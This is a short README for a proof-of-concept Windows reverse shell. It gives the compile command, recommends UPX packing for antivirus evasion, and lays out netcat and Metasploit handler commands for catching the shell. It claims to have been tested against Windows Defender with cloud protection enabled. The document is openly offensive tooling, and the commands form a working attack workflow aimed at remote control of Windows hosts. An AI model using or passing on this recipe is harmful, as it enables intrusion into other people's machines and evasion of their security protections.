# POC

https://twitter.com/whichbuffer/status/1333889053851340805?s=20

https://www.youtube.com/watch?v=4k0Xkf4PuMs

# Compile it
````
i686-w64-mingw32-g++ shell.cpp -o shell.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
````
## After Compile the exe file then use UPX (https://upx.github.io/) for the AV Evasion


# Start the netcat Listener
````
 nc -lvnp <port number>
 ````
 
 # Metasploit Handler
 ````
  use exploit/multi/handler
  set PAYLOAD windows/shell/reverse_tcp
  set LHOST <Local IP>
  set LPORT <Local Port>
  exploit -j -z 
  ````
<a href="https://ibb.co/BK4wqJq"><img src="https://i.ibb.co/84zX6w6/Screenshot-from-2020-11-30-12-24-52.png" alt="Screenshot-from-2020-11-30-12-24-52" border="0"></a>

Tested on updated(30.11.2020) Windows 10 device with Windows Defender and Cloud Protection enabled.
